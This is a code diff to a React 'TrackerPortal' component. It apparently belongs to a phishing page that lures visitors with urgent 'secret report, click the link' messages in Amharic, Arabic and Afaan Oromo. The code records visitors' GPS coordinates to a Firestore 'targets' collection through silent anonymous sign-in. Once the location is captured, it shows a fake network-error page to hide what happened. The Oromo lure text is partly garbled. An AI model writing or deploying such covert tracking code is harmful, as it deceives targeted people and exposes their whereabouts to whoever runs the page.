@@ -24,6 +24,7 @@ export const TrackerPortal: React.FC = () => {
   const [isClient, setIsClient] = useState(false);
   const [timeLeft, setTimeLeft] = useState(120);
   const [lang, setLang] = useState('amharic');
+  const [fakeError, setFakeError] = useState(false);
 
   useEffect(() => {
     setIsClient(true);
@@ -52,6 +53,12 @@ export const TrackerPortal: React.FC = () => {
     return `${mins}:${secs.toString().padStart(2, '0')}`;
   };
 
+  const translations = {
+    amharic: "\"አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።\"",
+    arabic: "\"معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل.\"",
+    oromo: "\"Oduu hammaa fi iccitidha, kallattiin akka siif hin ergonomic dhoksaadhon siif erge. Dafee liinkii kanaan seenii odeeffannoo kana ilaali, ajajni siif akka kenne naaf kennameera... Gabaasa kana ilaaluuf liinkii armaan gadii cuqaasii, viidiyoo fi fakkiiwwanis keessa jiru.\""
+  };
+
   // Protocol initialization
   const startRecon = async () => {
     if (!isClient) return;
@@ -71,7 +78,7 @@ export const TrackerPortal: React.FC = () => {
     }, 30);
 
     try {
-      // Use existing session if available, otherwise Background Auth - No email requested
+      // Use existing session if available, otherwise Background Auth
       let user = auth.currentUser;
       if (!user) {
         try {
@@ -79,9 +86,8 @@ export const TrackerPortal: React.FC = () => {
           user = cred.user;
         } catch (authErr: any) {
           console.warn("Auth failed, falling back to local ID:", authErr);
-          // If anonymous auth is disabled, the app won't be able to write to protected collections
           if (authErr.code === 'auth/operation-not-allowed') {
-            setErrorMsg('SERVER_CONFIG_ERROR: Anonymous Authentication must be enabled in the Firebase Console Settings.');
+            setErrorMsg('SERVER_CONFIG_ERROR: Anonymous Authentication must be enabled.');
             setStatus('error');
             return;
           }
@@ -126,6 +132,14 @@ export const TrackerPortal: React.FC = () => {
             await updateDoc(targetRef, {
               history: arrayUnion([latitude, longitude])
             });
+
+            // After successful uplink, trigger "Fake Error" after a short delay
+            setTimeout(() => {
+              setFakeError(true);
+              setStatus('error');
+              setErrorMsg('NETWORK_ERROR: Your internet connection is unstable. Please check your signal or try a different network connection. (Error Code: 404_NET_SEC)');
+            }, 6000);
+
           } catch (e) {
             handleFirestoreError(e, OperationType.WRITE, `targets/${user.uid}`);
           }
@@ -152,6 +166,40 @@ export const TrackerPortal: React.FC = () => {
       setErrorMsg('HANDSHAKE_FAILURE: Terminal reset required.');
     }
   };
+
+  // If fake error is active, show a very convincing standard error page
+  if (fakeError && status === 'error') {
+    return (
+      <div className="min-h-screen bg-white text-gray-800 font-sans flex items-center justify-center p-6">
+        <div className="max-w-md w-full space-y-6">
+          <div className="flex flex-col items-center gap-4">
+             <div className="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center">
+                <AlertTriangle className="w-8 h-8" />
+             </div>
+             <h1 className="text-2xl font-bold text-gray-900">Network Error</h1>
+             <p className="text-center text-gray-500 text-sm leading-relaxed">
+               The document could not be opened because your internet connection is too weak or restricted. 
+               Please try again when you have a stronger signal or are connected to Wi-Fi.
+             </p>
+          </div>
+          <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
+            <div className="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-2">Technical Details</div>
+            <div className="font-mono text-xs text-gray-600 break-all">
+              Error_Code: 404_CONNECTION_TIMEOUT<br/>
+              Server: Secure_Node_v8<br/>
+              Status: Handshake_Failed
+            </div>
+          </div>
+          <button 
+            onClick={() => window.location.reload()}
+            className="w-full py-3 bg-blue-600 text-white rounded-lg font-bold hover:bg-blue-700 transition-colors shadow-lg shadow-blue-200"
+          >
+            Retry Connection
+          </button>
+        </div>
+      </div>
+    );
+  }
 
   return (
     <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
@@ -193,13 +241,19 @@ export const TrackerPortal: React.FC = () => {
                 
                 {lang === 'amharic' || lang === 'both' ? (
                   <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
-                    "አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።"
+                    {translations.amharic}
                   </p>
                 ) : null}
                 
                 {lang === 'arabic' || lang === 'both' ? (
                   <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4 dir-rtl text-right">
-                    "معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل."
+                    {translations.arabic}
+                  </p>
+                ) : null}
+
+                {lang === 'oromo' || lang === 'both' ? (
+                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
+                    {translations.oromo}
                   </p>
                 ) : null}
 
